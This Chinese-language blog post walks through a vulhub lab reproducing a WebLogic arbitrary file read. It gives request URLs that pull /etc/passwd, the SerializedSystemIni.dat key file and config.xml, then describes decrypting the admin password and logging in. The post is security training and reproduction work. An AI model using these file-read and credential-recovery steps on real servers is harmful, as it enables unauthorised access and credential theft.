ailx10说：这篇是我2024年9月写的。这篇实验里，我先从一个文件读取入口拿到 WebLogic 的配置文件和密钥文件，再借工具还原管理口令，最后尝试登录。它让我看到，敏感文件泄露的影响不一定停在“看到了配置”这一步，几份文件放在一起可能带来更多信息。不过这里的读取入口是靶场提供的，不能顺手说成所有 WebLogic 都自带这样一个地址。我把下载和处理文件的细节留下，尤其二进制内容不能随便按普通文本改，前面多出的响应内容也得先分清来源。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Weblogic 任意文件读取漏洞 环境搭建成功了

![](/notes-assets/2760a3713881fe058667.webp)

（1）试一试弱口令 `weblogic/weblogic` 很遗憾，没有登录成功

（2）任意文件读取，访问下面的网址，可以得到passwd信息

```
http://144.34.162.13:7001/hello/file.jsp?path=/etc/passwd
```

![](/notes-assets/81a2ed208bb27846ff8c.webp)

（3）weblogic密码使用AES加密，对称加密可解密

- 密文在`config.xml`
- 密钥在`SerializedSystemIni.dat`

（4）下载`SerializedSystemIni.dat` ，去掉前面2空行

```
http://144.34.162.13:7001/hello/file.jsp?path=security/SerializedSystemIni.dat
```

（5）下载`config.xml`

```
http://144.34.162.13:7001/hello/file.jsp?path=config/config.xml
```

![](/notes-assets/0f78774aa04145cceeef.webp)

（6）使用工具进行解密，得到`weblogic`的密码`Oracle@123`

![](/notes-assets/a749707cf8a029301084.webp)

（7）登录成功

![](/notes-assets/36b726940d5ba35dc73d.webp)

这次从读文件走到了管理登录，影响正是几份材料拼在一起后出现的。回看链路时，不只盯着单个密码字段，也要看密钥材料和配置是否被同样保护。
